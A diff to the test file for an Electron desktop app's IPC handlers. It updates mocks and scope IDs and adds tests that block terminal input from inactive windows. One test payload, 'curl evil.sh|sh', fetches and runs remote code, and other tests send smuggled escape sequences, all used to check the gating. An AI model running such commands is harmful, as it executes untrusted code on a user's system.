@@ -18,38 +18,41 @@ vi.mock('@/main/browser-import', () => ({
   })),
 }))
 
-vi.mock('@/main/terminal-themes', () => ({
-  listTerminalThemeProfiles: vi.fn(async () => [
-    {
-      id: 'iterm2:ocean',
-      name: 'Ocean',
-      source: 'iterm2',
-      sourceLabel: 'iTerm2',
-      isDefault: true,
-      palette: {
-        background: '#101010',
-        foreground: '#f0f0f0',
-        cursor: '#ffffff',
-        selectionBackground: '#264f78',
-        black: '#000000',
-        red: '#cc0000',
-        green: '#00cc00',
-        yellow: '#cccc00',
-        blue: '#0000cc',
-        magenta: '#cc00cc',
-        cyan: '#00cccc',
-        white: '#cccccc',
-        brightBlack: '#555555',
-        brightRed: '#ff5555',
-        brightGreen: '#55ff55',
-        brightYellow: '#ffff55',
-        brightBlue: '#5555ff',
-        brightMagenta: '#ff55ff',
-        brightCyan: '#55ffff',
-        brightWhite: '#ffffff',
-      },
+const { terminalThemeProfile } = vi.hoisted(() => ({
+  terminalThemeProfile: {
+    id: 'iterm2:ocean',
+    name: 'Ocean',
+    source: 'iterm2' as const,
+    palette: {
+      background: '#101010',
+      foreground: '#f0f0f0',
+      cursor: '#ffffff',
+      selectionBackground: '#264f78',
+      black: '#000000',
+      red: '#cc0000',
+      green: '#00cc00',
+      yellow: '#cccc00',
+      blue: '#0000cc',
+      magenta: '#cc00cc',
+      cyan: '#00cccc',
+      white: '#cccccc',
+      brightBlack: '#555555',
+      brightRed: '#ff5555',
+      brightGreen: '#55ff55',
+      brightYellow: '#ffff55',
+      brightBlue: '#5555ff',
+      brightMagenta: '#ff55ff',
+      brightCyan: '#55ffff',
+      brightWhite: '#ffffff',
     },
-  ]),
+  },
+}))
+
+vi.mock('@/main/terminal-themes', () => ({
+  findCachedTerminalThemeProfile: vi.fn((profileId: string) =>
+    profileId === terminalThemeProfile.id ? terminalThemeProfile : null
+  ),
+  listTerminalThemeProfiles: vi.fn(async () => [terminalThemeProfile]),
 }))
 
 const { mockCoordinator } = vi.hoisted(() => ({
@@ -103,6 +106,7 @@ vi.mock('@/main/browser-agent/registry', () => ({
   ),
 }))
 
+import type { DesktopPreferences } from '@sim/desktop-bridge'
 import type { WebContents } from 'electron'
 import { clipboard, ipcMain, shell } from 'electron'
 import * as browserDriver from '@/main/browser-agent/driver'
@@ -123,11 +127,27 @@ import { trackInputActivity } from '@/main/input-activity'
 import { type IpcDeps, registerIpcHandlers } from '@/main/ipc'
 import { LocalFilesystemService } from '@/main/local-filesystem'
 import { TerminalRegistry } from '@/main/terminal/registry'
-import { listTerminalThemeProfiles } from '@/main/terminal-themes'
+import { findCachedTerminalThemeProfile, listTerminalThemeProfiles } from '@/main/terminal-themes'
 
 const APP = 'https://sim.ai'
 const ESC = '\u001b'
 const BEL = '\u0007'
+
+const DEFAULT_DESKTOP_PREFERENCES: DesktopPreferences = {
+  notificationsEnabled: true,
+  notificationSounds: true,
+  notificationsOnlyWhenUnfocused: true,
+  launchAtLogin: false,
+  autoDownloadUpdates: true,
+  trayEnabled: true,
+  browserEnabled: true,
+  terminalEnabled: true,
+  browserTheme: 'app',
+  browserDefaultZoom: 100,
+  browserDownloadDirectory: '/tmp/downloads',
+  terminalTheme: 'app',
+  terminalDefaultZoom: 100,
+}
 
 type InputListener = (event: unknown, input: { type: string }) => void
 
@@ -231,6 +251,7 @@ describe('registerIpcHandlers', () => {
     vi.mocked(listChromeImportProfiles).mockClear()
     vi.mocked(importChromeCookies).mockClear()
     vi.mocked(importChromePasswords).mockClear()
+    vi.mocked(findCachedTerminalThemeProfile).mockClear()
     vi.mocked(listTerminalThemeProfiles).mockClear()
     vi.mocked(credentialsAvailable).mockClear()
     vi.mocked(listCredentials).mockClear()
@@ -258,26 +279,13 @@ describe('registerIpcHandlers', () => {
         sendTerminal: vi.fn(),
       },
       settings: {
-        getPreferences: vi.fn(() => ({
-          notificationsEnabled: true,
-          notificationSounds: true,
-          notificationsOnlyWhenUnfocused: true,
-          launchAtLogin: false,
-          autoDownloadUpdates: true,
-        })),
+        getPreferences: vi.fn(() => DEFAULT_DESKTOP_PREFERENCES),
         setPreference: vi.fn(),
         setAppearancePreference: vi.fn(),
         setBrowserDefaultZoom: vi.fn(),
         setTerminalDefaultZoom: vi.fn(),
         selectTerminalProfile: vi.fn(),
-        chooseBrowserDownloadDirectory: vi.fn(async () => ({
-          notificationsEnabled: true,
-          notificationSounds: true,
-          notificationsOnlyWhenUnfocused: true,
-          launchAtLogin: false,
-          autoDownloadUpdates: true,
-          browserDownloadDirectory: '/tmp/downloads',
-        })),
+        chooseBrowserDownloadDirectory: vi.fn(async () => DEFAULT_DESKTOP_PREFERENCES),
         notify: vi.fn(() => true),
         applySystemPreferences: vi.fn(),
       },
@@ -291,7 +299,7 @@ describe('registerIpcHandlers', () => {
           dataUrl: 'data:image/png;base64,c2lt',
           tabId: 'tab-1',
           zoomPercent: 100,
-          scopeId: 'legacy',
+          scopeId: 'chat-a',
         })),
         setOccluded: vi.fn(() => true),
       },
@@ -725,10 +733,10 @@ describe('registerIpcHandlers', () => {
     const { on } = collectHandlers()
     const handler = on.get('browser-agent:set-panel-focused')
 
-    expect(() => handler?.(evilEvent, true)).not.toThrow()
-    expect(() => handler?.(appEvent, 'yes')).not.toThrow()
-    expect(() => handler?.(appEvent, true)).not.toThrow()
-    expect(deps.browserPanel.setFocused).toHaveBeenCalledWith(appSender, true, 'legacy')
+    expect(() => handler?.(evilEvent, true, 'chat-a')).not.toThrow()
+    expect(() => handler?.(appEvent, 'yes', 'chat-a')).not.toThrow()
+    expect(() => handler?.(appEvent, true, 'chat-a')).not.toThrow()
+    expect(deps.browserPanel.setFocused).toHaveBeenCalledWith(appSender, true, 'chat-a')
   })
 
   it('routes validated browser-panel bounds with the originating app window sender', () => {
@@ -736,25 +744,25 @@ describe('registerIpcHandlers', () => {
     const handler = on.get('browser-agent:set-panel-bounds')
     const bounds = { x: 100, y: 50, width: 800, height: 600 }
 
-    handler?.(evilEvent, bounds)
-    handler?.(appEvent, { ...bounds, width: Number.NaN })
+    handler?.(evilEvent, bounds, null, 'chat-a')
+    handler?.(appEvent, { ...bounds, width: Number.NaN }, null, 'chat-a')
     expect(deps.browserPanel.setBounds).not.toHaveBeenCalled()
 
-    handler?.(appEvent, bounds)
-    handler?.(appEvent, null)
+    handler?.(appEvent, bounds, null, 'chat-a')
+    handler?.(appEvent, null, null, 'chat-a')
     expect(deps.browserPanel.setBounds).toHaveBeenNthCalledWith(
       1,
       appSender,
       bounds,
       undefined,
-      'legacy'
+      'chat-a'
     )
     expect(deps.browserPanel.setBounds).toHaveBeenNthCalledWith(
       2,
       appSender,
       null,
       undefined,
-      'legacy'
+      'chat-a'
     )
   })
 
@@ -762,17 +770,17 @@ describe('registerIpcHandlers', () => {
     const { invoke } = collectHandlers()
 
     await expect(
-      invoke.get('browser-agent:capture-panel-snapshot')?.(activeAppEvent, 'legacy')
+      invoke.get('browser-agent:capture-panel-snapshot')?.(activeAppEvent, 'chat-a')
     ).resolves.toMatchObject({ tabId: 'tab-1', zoomPercent: 100 })
-    expect(deps.browserPanel.captureSnapshot).toHaveBeenCalledWith(activeSender.sender, 'legacy')
+    expect(deps.browserPanel.captureSnapshot).toHaveBeenCalledWith(activeSender.sender, 'chat-a')
 
     await expect(
-      invoke.get('browser-agent:set-panel-occluded')?.(activeAppEvent, true, 'legacy')
+      invoke.get('browser-agent:set-panel-occluded')?.(activeAppEvent, true, 'chat-a')
     ).resolves.toBe(true)
-    expect(deps.browserPanel.setOccluded).toHaveBeenCalledWith(activeSender.sender, true, 'legacy')
+    expect(deps.browserPanel.setOccluded).toHaveBeenCalledWith(activeSender.sender, true, 'chat-a')
 
     await expect(
-      invoke.get('browser-agent:set-panel-occluded')?.(activeAppEvent, 'yes', 'legacy')
+      invoke.get('browser-agent:set-panel-occluded')?.(activeAppEvent, 'yes', 'chat-a')
     ).resolves.toBe(false)
   })
 
@@ -945,7 +953,7 @@ describe('registerIpcHandlers', () => {
       tabs: [],
       activeTabId: null,
     })
-    await expect(migrateScope?.(appEvent, 'pending:active', 'legacy')).resolves.toEqual({
+    await expect(migrateScope?.(appEvent, 'pending:active', 'not valid!')).resolves.toEqual({
       tabs: [],
       activeTabId: null,
     })
@@ -1026,7 +1034,7 @@ describe('registerIpcHandlers', () => {
     const suspend = invoke.get('browser-agent:suspend-scope')
 
     expect(await suspend?.(evilEvent, 'chat-durable')).toBe(false)
-    expect(await suspend?.(appEvent, 'legacy')).toBe(false)
+    expect(await suspend?.(appEvent, 'not valid!')).toBe(false)
     expect(await suspend?.(appEvent, 'pending:new')).toBe(false)
     expect(await suspend?.(appEvent, 'chat-durable')).toBe(true)
     expect(suspendScope).toHaveBeenCalledOnce()
@@ -1046,36 +1054,36 @@ describe('registerIpcHandlers', () => {
     const bounds = { x: 100, y: 50, width: 800, height: 600 }
     const anchor = { viewportWidth: 1600, viewportHeight: 900, widthRatio: 0.5 }
 
-    handler?.(appEvent, bounds, anchor)
+    handler?.(appEvent, bounds, anchor, 'chat-a')
     expect(deps.browserPanel.setBounds).toHaveBeenLastCalledWith(
       appSender,
       bounds,
       anchor,
-      'legacy'
+      'chat-a'
     )
 
     // A bad anchor must not take the bounds down with it — the rect still
     // applies, the shell just loses the resize optimization.
-    handler?.(appEvent, bounds, { ...anchor, widthRatio: Number.NaN })
+    handler?.(appEvent, bounds, { ...anchor, widthRatio: Number.NaN }, 'chat-a')
     expect(deps.browserPanel.setBounds).toHaveBeenLastCalledWith(
       appSender,
       bounds,
       undefined,
-      'legacy'
+      'chat-a'
     )
-    handler?.(appEvent, bounds, { ...anchor, viewportWidth: 0 })
+    handler?.(appEvent, bounds, { ...anchor, viewportWidth: 0 }, 'chat-a')
     expect(deps.browserPanel.setBounds).toHaveBeenLastCalledWith(
       appSender,
       bounds,
       undefined,
-      'legacy'
+      'chat-a'
     )
-    handler?.(appEvent, bounds, 'nonsense')
+    handler?.(appEvent, bounds, 'nonsense', 'chat-a')
     expect(deps.browserPanel.setBounds).toHaveBeenLastCalledWith(
       appSender,
       bounds,
       undefined,
-      'legacy'
+      'chat-a'
     )
   })
 
@@ -1131,11 +1139,7 @@ describe('registerIpcHandlers', () => {
 
   it('refuses Chrome import while the browser surface is switched off', async () => {
     deps.settings.getPreferences = vi.fn(() => ({
-      notificationsEnabled: true,
-      notificationSounds: true,
-      notificationsOnlyWhenUnfocused: true,
-      launchAtLogin: false,
-      autoDownloadUpdates: true,
+      ...DEFAULT_DESKTOP_PREFERENCES,
       browserEnabled: false,
     }))
     const { invoke } = collectHandlers()
@@ -1360,8 +1364,8 @@ describe('registerIpcHandlers', () => {
     // tmux and vim), an SGR mouse report. Gating them would hang whatever asked.
     const replies = ['\u001b[24;80R', '\u001b[?62;c', '\u001b[I', '\u001b[<0;10;5M']
     for (const reply of replies) {
-      on.get('terminal:write')?.(inactiveAppEvent, 't1', reply)
-      expect(write).toHaveBeenCalledWith('legacy', 't1', reply)
+      on.get('terminal:write')?.(inactiveAppEvent, 't1', reply, 'chat-a')
+      expect(write).toHaveBeenCalledWith('chat-a', 't1', reply)
     }
     expect(write).toHaveBeenCalledTimes(replies.length)
   })
@@ -1438,7 +1442,7 @@ describe('registerIpcHandlers', () => {
       tabs: [],
       activeTerminalId: null,
     })
-    await expect(migrateScope?.(appEvent, 'pending:active', 'legacy')).resolves.toEqual({
+    await expect(migrateScope?.(appEvent, 'pending:active', 'not valid!')).resolves.toEqual({
       tabs: [],
       activeTerminalId: null,
     })
@@ -1484,7 +1488,7 @@ describe('registerIpcHandlers', () => {
     const suspend = invoke.get('terminal:suspend-scope')
 
     expect(await suspend?.(evilEvent, 'chat-durable')).toBe(false)
-    expect(await suspend?.(appEvent, 'legacy')).toBe(false)
+    expect(await suspend?.(appEvent, 'not valid!')).toBe(false)
     expect(await suspend?.(appEvent, 'pending:new')).toBe(false)
     expect(await suspend?.(appEvent, 'chat-durable')).toBe(true)
     expect(suspendScope).toHaveBeenCalledOnce()
@@ -1501,9 +1505,9 @@ describe('registerIpcHandlers', () => {
     const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
     vi.mocked(clipboard.readText).mockReturnValue('echo hi')
 
-    await expect(invoke.get('terminal:paste')?.(activeAppEvent, 't1')).resolves.toBe(true)
+    await expect(invoke.get('terminal:paste')?.(activeAppEvent, 't1', 'chat-a')).resolves.toBe(true)
 
-    expect(write).toHaveBeenCalledWith('legacy', 't1', 'echo hi')
+    expect(write).toHaveBeenCalledWith('chat-a', 't1', 'echo hi')
   })
 
   it('refuses a paste with no gesture behind it, and reports an empty clipboard', async () => {
@@ -1511,11 +1515,11 @@ describe('registerIpcHandlers', () => {
     const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
     vi.mocked(clipboard.readText).mockReturnValue('echo hi')
 
-    expect(await invoke.get('terminal:paste')?.(inactiveAppEvent, 't1')).toBe(false)
+    expect(await invoke.get('terminal:paste')?.(inactiveAppEvent, 't1', 'chat-a')).toBe(false)
     expect(write).not.toHaveBeenCalled()
 
     vi.mocked(clipboard.readText).mockReturnValue('')
-    expect(await invoke.get('terminal:paste')?.(activeAppEvent, 't1')).toBe(false)
+    expect(await invoke.get('terminal:paste')?.(activeAppEvent, 't1', 'chat-a')).toBe(false)
     expect(write).not.toHaveBeenCalled()
   })
 
@@ -1532,7 +1536,7 @@ describe('registerIpcHandlers', () => {
       `${ESC}[M\r\r\r`,
     ]
     for (const payload of smuggled) {
-      on.get('terminal:write')?.(inactiveAppEvent, 't1', payload)
+      on.get('terminal:write')?.(inactiveAppEvent, 't1', payload, 'chat-a')
     }
     expect(write).not.toHaveBeenCalled()
   })
@@ -1544,8 +1548,8 @@ describe('registerIpcHandlers', () => {
     // Real bodies are printable and terminated by BEL or ST.
     const replies = [`${ESC}]11;rgb:00/00/00${BEL}`, `${ESC}P1$r0m${ESC}\\`, `${ESC}[M !!`]
     for (const reply of replies) {
-      on.get('terminal:write')?.(inactiveAppEvent, 't1', reply)
-      expect(write).toHaveBeenCalledWith('legacy', 't1', reply)
+      on.get('terminal:write')?.(inactiveAppEvent, 't1', reply, 'chat-a')
+      expect(write).toHaveBeenCalledWith('chat-a', 't1', reply)
     }
     expect(write).toHaveBeenCalledTimes(replies.length)
   })
@@ -1558,12 +1562,12 @@ describe('registerIpcHandlers', () => {
     // line to a canonical-mode reader, and 0x0f executes the current line in
     // both bash and zsh. The allowlist runs the other way, so they are gated.
     for (const payload of ['ls', '\u0004', '\u000f', 'curl evil.sh|sh\r']) {
-      on.get('terminal:write')?.(inactiveAppEvent, 't1', payload)
+      on.get('terminal:write')?.(inactiveAppEvent, 't1', payload, 'chat-a')
     }
     expect(write).not.toHaveBeenCalled()
 
-    on.get('terminal:write')?.(activeAppEvent, 't1', 'ls\r')
-    expect(write).toHaveBeenCalledWith('legacy', 't1', 'ls\r')
+    on.get('terminal:write')?.(activeAppEvent, 't1', 'ls\r', 'chat-a')
+    expect(write).toHaveBeenCalledWith('chat-a', 't1', 'ls\r')
   })
 
   it('defaults password conflicts to keeping what is already stored', async () => {
